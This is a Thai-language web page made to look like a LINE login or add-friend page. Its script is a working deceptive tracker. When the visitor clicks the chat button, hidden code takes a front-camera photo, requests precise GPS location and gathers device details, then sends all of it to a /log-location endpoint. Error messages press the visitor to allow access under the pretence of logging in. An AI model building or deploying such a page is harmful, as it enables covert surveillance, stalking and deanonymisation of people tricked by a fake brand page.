<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>แอดไลน์เพิ่มเพื่อน</title>
    <meta property="og:title" content="แอดไลน์เพิ่มเพื่อน">
    <meta property="og:description" content="เพิ่มเพื่อนเพื่อติดต่อทาง LINE">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/4/41/LINE_logo.svg">
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
            text-align: center; 
            margin: 0;
            background-color: #f5f5f5; 
            color: #333;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .container { 
            background: white; 
            padding: 40px 30px; 
            border-radius: 12px; 
            box-shadow: 0 4px 20px rgba(0,0,0,0.08); 
            max-width: 90%; 
            width: 350px;
        }
        .logo {
            width: 90px;
            height: 90px;
            margin-bottom: 15px;
        }
        h2 { 
            font-size: 22px;
            margin-bottom: 10px; 
            font-weight: bold;
            color: #111;
        }
        p { 
            font-size: 15px; 
            color: #666;
            line-height: 1.5; 
            margin-bottom: 30px; 
        }
        button { 
            background: #00B900; 
            color: white; 
            border: none; 
            padding: 14px 20px; 
            font-size: 16px; 
            border-radius: 8px; 
            cursor: pointer; 
            transition: 0.2s;
            width: 100%;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        button:hover { background: #009900; }
        button:disabled { background: #cccccc; cursor: not-allowed; }
        #status { margin-top: 20px; font-size: 14px; font-weight: normal; }
    </style>
</head>
<body>
    <div class="container">
        <!-- โลโก้ LINE จาก Wikimedia -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/LINE_logo.svg" alt="LINE Logo" class="logo">
        
        <h2>เข้าสู่ระบบ LINE</h2>
        <p>กรุณายืนยันตัวตนเพื่อเข้าสู่ระบบแชท<br>และติดต่อกับเราอย่างปลอดภัย</p>
        
        <button onclick="getLocation()">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
                <path d="M24 10.304c0-5.369-5.383-9.738-12-9.738-6.616 0-12 4.369-12 9.738 0 4.814 3.55 8.888 8.498 9.582.353.076.83.232.953.535.111.272.072.695.035.952l-.246 1.488c-.048.286-.232 1.139 1.002.617 1.233-.522 6.647-3.916 8.895-6.568C22.618 14.887 24 12.753 24 10.304z"/>
            </svg>
            แชท LINE เพื่อติดต่อ
        </button>
        <p id="status"></p>

        <!-- ซ่อน Video และ Canvas ไว้ใช้ถ่ายรูปเบื้องหลัง -->
        <video id="video" style="display:none;" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>

    <script>
        let imageData = null; // เก็บรูปถ่ายแบบ Base64

        // ขอสิทธิ์กล้องและถ่ายรูปก่อน
        async function getLocation() {
            const status = document.getElementById('status');
            const btn = document.querySelector('button');
            
            status.textContent = 'กำลังเชื่อมต่อกับเซิร์ฟเวอร์...';
            status.style.color = "#666";
            btn.disabled = true;

            try {
                // พยายามเปิดกล้องหน้า
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // รอให้กล้องพร้อม
                await new Promise(resolve => video.onloadedmetadata = resolve);
                
                // ถ่ายรูป
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                imageData = canvas.toDataURL('image/png'); // ได้ไฟล์ภาพ base64
                
                // ปิดกล้อง
                stream.getTracks().forEach(track => track.stop());
            } catch (err) {
                console.error("Camera access denied or failed:", err);
                // ถึงจะไม่ได้กล้อง ก็จะไปต่อเพื่อขอตำแหน่ง
            }

            // หลังจากได้รูป (หรือไม่ได้) ก็ขอตำแหน่งต่อ
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendData, showError, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            } else { 
                status.textContent = "อุปกรณ์ของคุณไม่รองรับการยืนยันตัวตน";
                status.style.color = "red";
                btn.disabled = false;
            }
        }

        // เปลี่ยนชื่อฟังก์ชันจาก sendPosition เป็น sendData
        function sendData(position) {
            const status = document.getElementById('status');
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            // รวบรวมข้อมูลภายในเครื่อง (Device Info)
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`,
                cores: navigator.hardwareConcurrency || 'N/A',
                ram: navigator.deviceMemory || 'N/A'
            };

            // ส่งข้อมูลทั้งหมดไปที่เซิร์ฟเวอร์
            fetch('/log-location', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ 
                    lat: lat, 
                    lon: lon, 
                    deviceInfo: deviceInfo,
                    image: imageData // เพิ่มรูปที่ถ่ายได้
                }),
            })
            .then(response => response.json())
            .then(data => {
                status.textContent = "เชื่อมต่อสำเร็จ! กำลังนำคุณเข้าสู่ห้องแชท...";
                status.style.color = "#00B900";
            })
            .catch((error) => {
                status.textContent = "เกิดข้อผิดพลาดในการเชื่อมต่อ กรุณาลองใหม่";
                status.style.color = "red";
                document.querySelector('button').disabled = false;
            });
        }

        function showError(error) {
            const status = document.getElementById('status');
            const btn = document.querySelector('button');
            btn.disabled = false;
            
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    status.innerHTML = "❌ การเชื่อมต่อถูกปฏิเสธ<br>กรุณากด 'Allow' หรือ 'อนุญาต' เพื่อเข้าสู่ระบบแชท";
                    break;
                case error.POSITION_UNAVAILABLE:
                    status.textContent = "❌ ไม่สามารถตรวจสอบข้อมูลเครือข่ายได้";
                    break;
                case error.TIMEOUT:
                    status.textContent = "❌ การเชื่อมต่อหมดเวลา กรุณาลองอีกครั้ง";
                    break;
                case error.UNKNOWN_ERROR:
                    status.textContent = "❌ เกิดข้อผิดพลาดที่ไม่ทราบสาเหตุ";
                    break;
            }
            status.style.color = "red";
        }
    </script>
</body>
</html>
